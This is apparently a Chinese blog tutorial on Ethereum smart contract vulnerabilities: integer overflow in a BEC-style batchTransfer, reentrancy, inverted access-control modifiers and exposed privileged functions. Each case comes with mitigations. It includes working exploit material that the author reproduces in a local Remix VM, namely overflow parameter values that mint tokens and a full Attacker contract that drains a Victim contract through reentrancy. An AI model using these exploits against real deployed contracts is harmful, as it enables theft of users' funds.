+<h2 id="代码片段"><a href="#代码片段" class="headerlink" title="代码片段"></a>代码片段</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">batchTransfer</span>(<span class="params">address[] _receivers, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line">  uint cnt = _receivers.length;</span><br><span class="line">  uint <span class="number">256</span> amount = uint256(cnt) * _value;</span><br><span class="line">  <span class="comment">//出现了成发运算，且amount缺少溢出判断，因此存在溢出的可能</span></span><br><span class="line">  <span class="built_in">require</span>(cnt &gt; <span class="number">0</span> &amp;&amp; cnt &lt;=<span class="number">20</span>);</span><br><span class="line">  <span class="built_in">require</span>(_value &gt;<span class="number">0</span> &amp;&amp; balances[msg.sender] &gt;= amount);</span><br><span class="line">  <span class="comment">//存在通过将amount溢出为0或极小值来绕过余额判断的可能</span></span><br><span class="line">  balances[msg.sender] = balances[msg.sender].sub(amount);</span><br><span class="line">  <span class="keyword">for</span>(uint i = <span class="number">0</span>; i &lt; cnt; i++)&#123;</span><br><span class="line">    balances[_receivers[i]] = balances[_receivers[i]].add(_value);</span><br><span class="line">    Transfer(msg.sender, _receivers[i], _value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数的作用是：让用户同时向多个人转账。第一个参数 _receivers 为 Address 数组类型，代表接收者地址，也就是可以向一整个数组的人转账。第二个参数 _value 为转账金额。</p>
+<p>这个函数的逻辑是：<br>获得数组的成员数（cnt），计算一共转多少钱（amount）<br>成员数要大于 0 且小于 20 ，然后转账的数值要大于 0 且要小于拥有的金额数才能继续</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>uint 256 amount = uint256(cnt) * _value;</code><br>在上下文中，没有对 amount 进行溢出判断，如果攻击者将 amount 溢出为 0 或者其他很小的值就能绕过用于对账户余额的判断<br><code>require(_value &gt;0 &amp;&amp; balances[msg.sender] &gt;= amount);</code></p>
+<p>在代码中可以看到 转账的金额能够被 cnt 和 _value 所控制，所以我们可以操纵这俩数值，来达到目的<br>具体步骤如下：</p>
+<ol>
+<li><p>创建两个地址，用于接收溢出转账</p>
+</li>
+<li><p>调用 batchTransfer() 函数，将 _receivers 设置为 <strong>uint256 的最大值 / 2 + 1</strong></p>
+</li>
+<li><p>这样，当计算 amount = uint256 的最大值 + 1，就超过了 uint256 的最大范围，成功溢出为 0</p>
+<blockquote>
+<p>奇数 115792089237316195423570985008687907853269984665640564039457584007913129639935 是 uint256 的最大值，如果把他除以二（刚好需要向下取整）然后加一，把这个作为 _value 的值，这样，再乘以一个 cnt 的值，得到的就刚好溢出</p>
+</blockquote>
+</li>
+<li><p>代码执行后，两个地址都会得到 _value 个 Token，也就是这两个账号会凭空增加  57896044618658097711785492504343953926634992332820282019728792003956564819968 个 Token（也就是 _value 值）</p>
+</li>
+</ol>
+<h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><p>去  <a href="https://cn.etherscan.com/address/0xc5d105e63711398af9bbff092d4b6769c82f793d" target="_blank" rel="noopener">这里</a>  看一下<br>代码复制出来，然后拿到 remix IDE 里面去编译一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587977523646-f6f1714e-8932-4933-9592-c8fd8f826dfa.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=123608&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后在 Run 里面，选择 Environment 为 JavaScript VM，然后选择 BecToken 合约 点击 Deplay 进行部署</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587977681693-6f6cb5e8-39d9-4f1b-a31d-19778c59aa6b.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=946&originWidth=1920&size=177661&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>记录一下账户的地址：<br>1：0xca35b7d915458ef540ade6068dfe2f44e8fa733c（主账户）<br>2：0x14723a09acff6d2a60dcdf7aa4aff308fddc160c<br>3：0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587978860772-a707e20d-3dfc-47ce-9f19-260050de3078.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=941&originWidth=1920&size=174373&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>_receivers：<br>[“0x14723a09acff6d2a60dcdf7aa4aff308fddc160c”,”0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db”]<br>_value：<br>57896044618658097711785492504343953926634992332820282019728792003956564819968</p>
+<p>然后点击  batchTransfer 的 transact<br>再用 balanceOf 看一下账户余额是不是变化了</p>
+<p>一开始主账户的金额：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587978982095-1851e990-2623-44a4-8e62-43b52ccaee7a.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&name=image.png&originHeight=185&originWidth=444&size=7931&status=done&style=stroke&width=380" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>其他账户（以第二个为例）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587978963350-a5376c7a-a3b5-4e48-8c12-2f9f926cc207.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&name=image.png&originHeight=179&originWidth=424&size=7161&status=done&style=stroke&width=378" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>转账之后第二个帐户的金额</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587979051634-3810f23d-77fc-43b6-8c56-d7ef2b4dd429.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=235&originWidth=455&size=12667&status=done&style=stroke&width=377" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再来看看第一个账户的金额，还是这样，这就说明我们复现成功了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587979125819-a5107b0f-0cfa-44df-bc16-af8b3916b203.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&name=image.png&originHeight=181&originWidth=448&size=7939&status=done&style=stroke&width=392" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="规避整型溢出：SafeMath-库"><a href="#规避整型溢出：SafeMath-库" class="headerlink" title="规避整型溢出：SafeMath 库"></a>规避整型溢出：SafeMath 库</h2><p>目前 solidity 还没有解决此问题，所以只能由各个合约自行完成整型溢出的判断<br>在任何时候，都不要在代码中直接使用 +、-、*、/ 来进行数学运算，而应使用 SafeMath 库<br>在 SafeMath 库中每个函数开头都用 语句进行了判断，对所有函数都进行了防溢出判断，可以有效地杜绝整型溢出问题</p>
+<h1 id="重入漏洞"><a href="#重入漏洞" class="headerlink" title="重入漏洞"></a>重入漏洞</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>以太坊智能合约的特点之一是能够调用其他外部合约的代码，然而这些外部合约可能被攻击者劫持，迫使合约通过回退函数进一步执行代码，包括回调本身。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">require</span>(msg.sender, call.value(balances[msg.sender])());</span><br><span class="line">  balances[msg.sender] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这种函数大多存在于钱包、去中心化交易所中，目的是为了让用户提款，将合约中的代币转换成通用的以太币<br>但是有个问题是他没有先对用户的代币余额进行清零，而智能合约进行转账的时候会调用收款方 fallback 函数</p>
+<blockquote>
+<p>合约可以有一个未命名的函数 —— Fallback 函数。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（fallback 函数）会被执行。另外<strong>每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，fallback 函数必须标记为 payable</strong>。 如果不存在这样的函数，则合约不能通过常规交易接收以太币</p>
+</blockquote>
+<p>如果构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588123839849-8145faef-3c2c-49dd-9b8d-c79f0aab2edb.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&originHeight=330&originWidth=508&size=0&status=done&style=stroke&width=508" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="以太坊支付通道及提款机制"><a href="#以太坊支付通道及提款机制" class="headerlink" title="以太坊支付通道及提款机制"></a>以太坊支付通道及提款机制</h2><p>以太坊的支付流程是：支付方（sender）将钱包里的以太币发送给以太坊网络，然后以太坊网络再把一定数量的以太币分配给接收方（recipient）。此外还要一部分额外的以太币作为交易费，而交易费不与交易量挂钩</p>
+<p>这就导致你发送 1 个以太币交易费是 0.00021 以太币，你转 0.0001 个以太币也要 0.00021 以太币，转账金额还不如交易费高显然是不能接受的，所以以太坊网络上建立支付通道，将发送方在网络上的存款和接收方从网络中提款分割为两个独立的活动</p>
+<p>对支付通道的使用进行一下说明：<br>首先发送方向网络发送一适当的存入资金，这笔存款就像交易一样，记录在区块链上，公开确认了发送方的存款行为<br>然后发送方直接向接收方发送支付承诺，发送方对接收方表示：“如果你发送了一笔包括这个支付承诺的交易，就会收到这些资金。”然而，关键在于这本身不是一笔交易。这意味着生成支付承诺可以省去交易费的成本</p>
+<p>发送方还可以向接收方多次发送承诺，比如一共发送了 3 次“发送 0.01 个以太币”的承诺，那接收方现在就有一个发送方的“发送 0.03 个以太币”的承诺</p>
+<p>只要把包含这个承诺的交易发送给网络，接收方就会收到这笔钱，而原本存在网络的资金剩下的会再返还给发送者</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587995917188-50b175cc-3a42-462f-88f6-328725058a66.png#align=left&display=inline&height=318&margin=%5Bobject%20Object%5D&originHeight=665&originWidth=800&size=0&status=done&style=stroke&width=382" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="常用转币方式"><a href="#常用转币方式" class="headerlink" title="常用转币方式"></a>常用转币方式</h2><address>.reansfer()
+发送失败时会通过 throw 回滚状态，只会传递 2300 个 gas 以供调用，从而防止重入
+
+<address>.send()
+发送失败时，返回布尔值 false，只会传递 2300 个 gas  以供调用，从而防止重入
+
+<address>.gas().call.value()()
+当发送失败时，返回布尔值 false 将传递所有可用的 gas 进行调用（可通过 gas(gas _value) 进行限制），不能有效防止重入攻击
+
+<h2 id="代码调试-1"><a href="#代码调试-1" class="headerlink" title="代码调试"></a>代码调试</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract Victim &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public userBalannce;</span><br><span class="line">    uint public amount = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Victim</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withDraw</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        uint amount = userBalannce[msg.sender];</span><br><span class="line">        <span class="keyword">if</span>(amount &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">            userBalannce[msg.sender] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">receiveEther</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(msg.value &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            userBalannce[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showAccount</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        amount = <span class="keyword">this</span>.balance;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    uint public amount = <span class="number">0</span>;</span><br><span class="line">    uint public test = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attacker</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;</span><br><span class="line">        test++;</span><br><span class="line">        Victim(msg.sender).withDraw();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showAccount</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        amount = <span class="keyword">this</span>.balance;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sendMoney</span>(<span class="params">address addr</span>)</span>&#123;</span><br><span class="line">        Victim(addr).receiveEther.value(<span class="number">1</span> ether)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reentry</span>(<span class="params">address addr</span>)</span>&#123;</span><br><span class="line">        Victim(addr).withDraw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>部署 Attacker 合约，给 Attacker 合约 1 以太币</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588121095109-0b19a25c-ce34-452d-9d46-b33e75a91009.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=158781&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>部署之后点击 showAccount 再点击 amount 看一下余额，成功</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588121181253-2b8c6c29-dbc3-4273-a150-ef957d536d82.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1920&size=163260&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>同样，部署 victim 合约，给他 10 以太币，目前账户余额如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588121302322-fe9130a7-ea93-443a-8bb1-409dd5a8034b.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=942&originWidth=1920&size=160030&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>调用 Attacker 合约的 sendMoney 函数，给 victim 转一个以太币</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588121584303-22382d72-a52c-4475-899d-2b4c712cda5d.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=164637&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>调用 Attacker 的  reentry 函数，进行攻击，然后看一下余额，发现原本在 victim 中的以太币全都到了  Attacker 合约中，同时 test 的值为 11，说明   fallback 函数被调用了 11 次</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588122269248-1c0c78f3-52ff-4fc4-ad10-78fdebfc7dd3.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1920&size=173090&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><p>重入漏洞的关键在于：利用回退函数调用函数本身，形成递归调用，在递归调用的过程中进行了转账操作，导致循环转账。虽然代码中存在判断语句，但是状态更新在函数调用之后，所以状态更新会因为循环调用而迟迟无法执行<br>广义上看，重入攻击条件有一下两个：</p>
+<ol>
+<li>调用合约外部函数。若外部函数是被攻击者所操纵的合约，就存在隐患</li>
+<li>外部函数操作优先于对状态的写操作</li>
+</ol>
+<p>所以，<strong>防范的关键在于编写合约的时候把写操作放在外部函数调用之前</strong><br>**</p>
+<h1 id="访问控制缺陷"><a href="#访问控制缺陷" class="headerlink" title="访问控制缺陷"></a>访问控制缺陷</h1><p>访问控制缺陷是因为编写 solidity 智能合约的时候，对于某些判断的定义不严谨或者笔误，导致的某些敏感功能的访问验证被绕过问题。攻击者可以恶意使用某些敏感功能</p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先看一段代码片段</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数修改器用于检验是否允许转移Token</span></span><br><span class="line">modifier isTokenTransfer&#123;</span><br><span class="line">  <span class="comment">//if token transfer is not allow</span></span><br><span class="line">  <span class="keyword">if</span>(!tokenTransfer)&#123;</span><br><span class="line">    revert();</span><br><span class="line">  &#125;</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数修改器用于检验是否来自钱包本身</span></span><br><span class="line">modifier onlyFromWallet&#123;</span><br><span class="line">  <span class="built_in">require</span>(msg.sender != walletAddress);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contructor(uint initial_balance,address wallet)&#123;</span><br><span class="line">  <span class="built_in">require</span>(wallet !=<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">require</span>(initial_balance !=<span class="number">0</span>);</span><br><span class="line">  _balances[msg.sender]==initial_balance;</span><br><span class="line">  _supply = initial_balance;</span><br><span class="line">  walletAddress = wallet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value</span>) <span class="title">isTokenTransfer</span> <span class="title">checkLock</span> <span class="title">returns</span> (<span class="params">bool success</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">require</span>(_balances[msg.sender] &gt;= value);</span><br><span class="line">  _balances[msg.sender] = _balances[msg.sender].sub(value);</span><br><span class="line">  _balances[to] = _balances[to].add(value);</span><br><span class="line">  Transfer(msg.sender,to,value);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableTokenTransfer</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">onlyFromWallet</span></span>&#123;</span><br><span class="line">  tokenTransfer = <span class="literal">true</span>;</span><br><span class="line">  TokenTransfer();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">disableTokenTransfer</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">onlyFromWallet</span></span>&#123;</span><br><span class="line">  tokenTransfer = <span class="literal">false</span>;</span><br><span class="line">  TokenTransfer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在代码中的  transfer  函数，除了转账功能还增加了两个修饰符  isTokenTransfer  和  checkLock，我们主要讨论  isTokenTransfer  函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier isTokenTransfer&#123;</span><br><span class="line">  <span class="keyword">if</span>(!tokenTransfer)&#123;</span><br><span class="line">    revert();</span><br><span class="line">  &#125;</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当  tokenTransfer  变量为  false  时，被  isTokenTransfer  修饰的函数是无法正常执行的，在  disableTokenTransfer  函数可以把这个变量改成  false，disableTokenTransfer  有一个修饰符是  onlyFromWallet  字面意思上看应该是只能合约本身去调用的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">disableTokenTransfer</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">onlyFromWallet</span></span>&#123;</span><br><span class="line">  tokenTransfer = <span class="literal">false</span>;</span><br><span class="line">  TokenTransfer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>onlyFromWallet  函数定义在这里</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyFromWallet&#123;</span><br><span class="line">  <span class="built_in">require</span>(msg.sender != walletAddress);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加这个本意是只能合约本身去调用的，但是这里 !=  的条件判断下来的话就是   如果调用者不是合约本身反而是通过的了</p>
+<h2 id="代码调试-2"><a href="#代码调试-2" class="headerlink" title="代码调试"></a>代码调试</h2><p><a href="https://cn.etherscan.com/address/0xb5a5f22694352c15b00323844ad545abb2b11028#code" target="_blank" rel="noopener">https://cn.etherscan.com/address/0xb5a5f22694352c15b00323844ad545abb2b11028#code</a><br>去这里复制一下代码</p>
+<p>用默认账户选择 IceToken 合约，在 wallet 中填上默认账户的地址，在 initial_balance 中填上 100，然后部署</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588169875514-148e07a8-0b0f-4fdb-a304-7eb96e9c3492.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=170642&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>切换到第二个账户，0x14723a09acff6d2a60dcdf7aa4aff308fddc160c<br>先点击 enableTokenTransfer，然后使用 reansfer() 向自己转移 0 个 Token，测试是否能用</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588170122418-74341ac8-7d1c-4793-8d46-b6a0900ea0d9.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=946&originWidth=1920&size=173851&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后我们使用 disableTokenTransfer 让转账不可用，注意，我们现在并不是合约的部署者，理论上说是不能修改这样的东西的，否则随便一个人就能让你的用户没法转帐？不能接受吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588170328652-c0faae85-ea57-4c53-85b1-2fc625c62742.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1920&size=165930&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>他的问题在这里</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyFromWallet &#123;</span><br><span class="line">       <span class="built_in">require</span>(msg.sender != walletAddress);</span><br><span class="line">       _;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>!= 应该是 == 的，这样结果反而是除合约所有者之外的所有人都可以更改了，实际上韩国有个区块链项目 ICON(ICX) 的智能合约就出现过这个问题</p>
+<h2 id="漏洞防范-1"><a href="#漏洞防范-1" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><p>必须对由于表征权限的变量和表示进行严格的控制，即这些敏感变量也应通过函数修饰符进行权限控制，从而保证权限闭环</p>
+<h1 id="特权功能暴露"><a href="#特权功能暴露" class="headerlink" title="特权功能暴露"></a>特权功能暴露</h1><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul>
+<li>在  solidity  中没有被权限修饰符修饰的函数，默认可以被所有人调用（即具有  public  属性）</li>
+<li>在 solidity  中有一个内置函数  selfdestruct() （析构函数）销毁当前合约，并把合约余额发送到某个地址中</li>
+</ul>
+<p>如果这俩情况同时发生在同一函数上，就意味着所有人都可以调用这个函数来获得合约的余额，当然，也不一定是析构函数，其他涉及敏感操作的函数（比如未鉴权的合约所有人转移、初始化等）暴露也会造成严重的后果</p>
